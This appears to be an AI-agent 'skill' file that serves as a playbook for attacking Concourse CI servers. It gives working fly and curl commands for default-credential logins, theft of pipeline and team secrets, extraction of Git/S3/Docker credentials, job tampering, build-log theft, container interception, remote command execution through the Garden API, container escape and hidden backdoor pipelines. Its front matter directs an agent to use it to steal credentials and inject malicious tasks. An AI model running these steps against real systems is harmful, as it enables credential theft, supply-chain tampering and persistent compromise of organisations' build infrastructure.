---
name: concourse-tactics
description: "Concourse CI penetration testing and exploitation. Use when a target runs a Concourse CI instance, when you obtain Fly CLI credentials or an API token, or when you need to steal credentials from a Concourse pipeline or inject malicious tasks. Covers unauthorized access, pipeline variable and private key theft, job tampering, resource credential extraction (Git/S3/Docker), task script injection, build log theft, worker exploitation, container escape, and pipeline backdoor persistence"
zh-signals: "Concourse CI 渗透测试与利用。信号:Concourse,CI/CD,Fly CLI,pipeline,凭据窃取,容器逃逸"
when-to-use: "Use when a target runs Concourse CI and you have Fly CLI credentials or an API token, or need to steal pipeline secrets, tamper jobs, or escape workers."
metadata:
  tags: "concourse,ci-cd,fly-cli,pipeline,worker,task,resource,build,container-escape,credential-theft"
  category: "postexploit"
---

# Concourse CI Penetration Testing and Exploitation Methodology

Concourse CI is a container-centric CI/CD system — every Task runs in an isolated container, pipeline configuration is stored as code, and all credentials are injected through the Credential Manager. Once Fly CLI credentials or an API token are obtained, attackers can steal all Secrets stored in pipeline variables, tamper with jobs to inject malicious tasks, extract Git/S3/Docker Registry credentials from resource configurations, hijack build logs and artifacts, and achieve container escape through the Garden container interface on worker nodes.

## Further Reading

Once you have identified a concrete attack path, load the reference document for full commands and exploitation payloads:

- Fly CLI commands, API calls, injection templates, worker exploitation → read [references/attack-techniques.md](references/attack-techniques.md)

## Phase 1: Instance Discovery and Unauthorized Access

### 1.1 Instance Identification

Concourse default ports and fingerprints:

| Component | Default port | Identification signature |
|---|---|---|
| Web UI / ATC API | 8080 / 443 | `/api/v1/info` returns the version, `/sky/login` login page |
| TSA (worker registration) | 2222 | SSH protocol, banner contains Concourse |
| Garden (container management) | 7777 | Local to the worker only |
| Baggageclaim (volume management) | 7788 | Local to the worker only |

```bash
# Fingerprint probing
curl -s https://TARGET:8080/api/v1/info | jq .
# Example response: {"version":"7.x.x","worker_version":"2.x","external_url":"..."}
```

### 1.2 Unauthorized API Enumeration

Concourse by default allows anonymous viewing of public pipelines in the `main` team:

```bash
# Public pipeline list
curl -s https://TARGET/api/v1/pipelines | jq '.[].name'

# Public team list
curl -s https://TARGET/api/v1/teams | jq '.[].name'

# Public build list (may leak job names and pipeline structure)
curl -s https://TARGET/api/v1/builds | jq '.[] | {id, pipeline_name, job_name, status}'
```

### 1.3 Credential Acquisition

```bash
# Default credential testing
fly -t target login -c https://TARGET -u admin -p admin
fly -t target login -c https://TARGET -u test -p test

# Use an already obtained Bearer token
curl -H "Authorization: Bearer $TOKEN" https://TARGET/api/v1/teams
```

## Phase 2: Pipeline Variable and Secret Theft

Pipeline variables are the highest-value attack targets — they typically contain AWS access keys, database passwords, SSH keys, and Docker Registry credentials.

### 2.1 Enumerate Pipeline Configuration

```bash
# List all pipelines
fly -t target pipelines -a

# Get the full YAML configuration of a given pipeline
fly -t target get-pipeline -p PIPELINE_NAME

# Fetch via API (includes variable references)
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM/pipelines/PIPELINE_NAME/config
```

### 2.2 Team-Level Variable Theft

```bash
# Get the variable list of a team
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM_NAME/vars

# Pipeline-level variables
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM_NAME/pipelines/PIPELINE_NAME/vars
```

Common high-value variable names: `aws_access_key_id`, `aws_secret_access_key`, `private_key`, `ssh_key`, `api_token`, `password`, `docker_username`, `docker_password`.

### 2.3 Credential Manager Backends

Concourse supports external Credential Managers (Vault/CredHub/AWS SSM/K8s Secrets). If the backend service is reachable, all injected secrets can be read directly:

| Backend | Path template | Exploitation method |
|---|---|---|
| Vault | `/concourse/TEAM/PIPELINE/VAR` | Vault token leak → direct read |
| CredHub | `/concourse/TEAM/PIPELINE/VAR` | CredHub CLI / API |
| AWS SSM | `/concourse/TEAM/PIPELINE/VAR` | AWS credentials → ssm:GetParameter |
| K8s Secrets | Secret under the `TEAM` namespace | kubectl get secret |

## Phase 3: Resource Credential Extraction and Job Tampering

### 3.1 Resource Credential Extraction

Pipeline resource definitions directly contain or reference credentials for external systems:

```bash
# Extract the source configuration of all resources
fly -t target get-pipeline -p PIPELINE_NAME | \
  python3 -c "import sys,yaml; d=yaml.safe_load(sys.stdin); [print(r['name'],r['type'],r.get('source',{})) for r in d.get('resources',[])]"
```

High-value resource types:

| Resource type | Extractable credentials |
|---|---|
| `git` | `private_key`, `username`/`password`, `access_token` |
| `s3` | `access_key_id`, `secret_access_key`, `session_token` |
| `docker-image` / `registry-image` | `username`/`password`, registry token |
| `github-release` | `access_token` |
| `pool` | Git repository credentials |
| `cf` (Cloud Foundry) | `username`/`password`, `client_id`/`client_secret` |

### 3.2 Job Tampering

If `set-pipeline` permission is available, the job plan can be modified to inject malicious steps:

```bash
# Export the current configuration
fly -t target get-pipeline -p PIPELINE_NAME > pipeline.yml

# Modify pipeline.yml to inject a malicious task into the target job plan
# Then set it again
fly -t target set-pipeline -p PIPELINE_NAME -c pipeline.yml

# Trigger execution
fly -t target trigger-job -j PIPELINE_NAME/JOB_NAME
```

→ read [references/attack-techniques.md](references/attack-techniques.md) for injection templates

## Phase 4: Build Log Theft and Task Script Injection

### 4.1 Build Log Theft

Build logs may leak secrets (developer `echo`/`env` output), internal addresses, and deployment targets:

```bash
# List recent builds
fly -t target builds -p PIPELINE_NAME

# Watch the build log in real time
fly -t target watch -j PIPELINE_NAME/JOB_NAME -b BUILD_NUMBER

# Bulk fetch the build event stream via the API
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/builds/BUILD_ID/events
```

### 4.2 Task Script Injection

If the task files in the Git repository referenced by the pipeline can be modified:

1. Modify the task YAML under the `.concourse/tasks/` or `ci/` directory of the repository
2. Inject commands into the task's `run.path` / `run.args`
3. Wait for the pipeline to trigger automatically, or trigger it manually

→ read [references/attack-techniques.md](references/attack-techniques.md) for the task YAML injection template

### 4.3 Intercept Into a Running Container

```bash
# List interceptable containers
fly -t target containers

# Enter the task container of a given build (requires the build to be running or completed)
fly -t target intercept -j PIPELINE_NAME/JOB_NAME -s STEP_NAME

# Inside the container you can:
# - Read the injected environment variables (secrets)
# - Access the mounted resource files
# - Probe the internal network
```

## Phase 5: Worker Exploitation and Container Escape

### 5.1 Worker Information Gathering

```bash
# List all workers
fly -t target workers

# Worker details (platform, tags, active container count)
fly -t target workers --details
```

### 5.2 Garden Container Management Interface

Garden on the worker (port 7777) is the container management API. If the worker network is reachable:

```bash
# List containers
curl http://WORKER_IP:7777/containers

# Execute a command inside a container
curl -X POST http://WORKER_IP:7777/containers/HANDLE/processes \
  -d '{"path":"sh","args":["-c","id && cat /proc/1/environ"]}'
```

### 5.3 Container Escape Paths

Concourse tasks run in unprivileged containers by default, but the following conditions can lead to escape:

| Escape condition | Check method | Exploitation method |
|---|---|---|
| `privileged: true` task | `privileged: true` in the pipeline YAML | Full Linux capabilities → mount the host filesystem |
| Docker socket mounted | `ls -la /var/run/docker.sock` | Docker API → privileged container |
| Garden API reachable | `curl http://127.0.0.1:7777/containers` | Create a privileged container |
| Host PID namespace | inspect `/proc/1/cgroup` | `nsenter` into the host |

→ read [references/attack-techniques.md](references/attack-techniques.md) for escape commands

### 5.4 Pipeline Backdoor Persistence

Achieve persistence by creating a hidden pipeline:

```bash
# Create a backdoor pipeline (uses a time trigger for scheduled execution)
fly -t target set-pipeline -p HIDDEN_NAME -c backdoor_pipeline.yml

# Expose the pipeline (optional, depending on stealth requirements)
fly -t target expose-pipeline -p HIDDEN_NAME

# Trigger
fly -t target trigger-job -j HIDDEN_NAME/JOB_NAME
```

→ read [references/attack-techniques.md](references/attack-techniques.md) for the backdoor pipeline YAML

## Decision Tree

```
Concourse CI instance discovered
├── Unauthenticated
│   ├── /api/v1/info → confirm version
│   ├── /api/v1/pipelines → public pipeline information disclosure
│   ├── /api/v1/builds → build history disclosure
│   ├── default credentials admin/admin → attempt login
│   └── cannot log in → search for leaked .flyrc / token
│
├── Authenticated (Fly CLI / API token)
│   ├── fly pipelines -a → enumerate all pipelines
│   │   ├── get-pipeline → extract resource credentials (Git/S3/Docker)
│   │   └── API /teams/TEAM/vars → steal team variables
│   │
│   ├── have set-pipeline permission?
│   │   ├── yes → tamper with the job and inject a malicious task → Phase 3
│   │   └── yes → create a backdoor pipeline → Phase 5
│   │
│   ├── build logs → fly watch → search for leaked secrets/internal information
│   ├── fly intercept → enter the container → read environment variables/probe internal network
│   └── fly workers → worker information → Garden API probing
│
└── Worker network reachable
    ├── Garden 7777 → container operations → escape
    ├── Baggageclaim 7788 → volume operations
    └── privileged task → container escape → host takeover
```

## Tool Quick Reference

| Tool | Purpose | Key commands |
|---|---|---|
| `fly` CLI | Official Concourse command line | `fly -t T login/pipelines/get-pipeline/intercept/workers` |
| `curl` + API | Direct REST API calls | `/api/v1/pipelines`, `/api/v1/teams/T/vars` |
| `.flyrc` | Fly CLI credential file | `~/.flyrc` holds the token and can be reused directly |
| `jq` / `python3 -c yaml` | Pipeline YAML parsing | Extract credentials from resource source blocks |
| Garden API | Worker container management | `http://WORKER:7777/containers` |

## Notes

- **Audit logs**: the Concourse ATC records all API calls and Fly CLI operations; `set-pipeline`, `trigger-job`, and `intercept` all leave traces
- **Token lifetime**: Fly CLI tokens expire after 24 hours by default and must be refreshed; API token lifetime depends on the auth provider configuration
- **Team isolation**: Concourse uses teams as the isolation boundary, and pipelines/variables/workers of different teams are invisible to each other; the `main` team usually holds global administrative rights
- **Credential Manager**: if Concourse is configured with Vault/CredHub, the pipeline variable API may return `redacted` — the backend store must be attacked directly
- **Container ephemerality**: task containers are destroyed once the build completes, so persistence relies on scheduled pipeline triggers or a backdoor resource
- **Worker isolation**: workers do not communicate directly with each other, but containers sharing the same Garden instance may be vulnerable to side channels
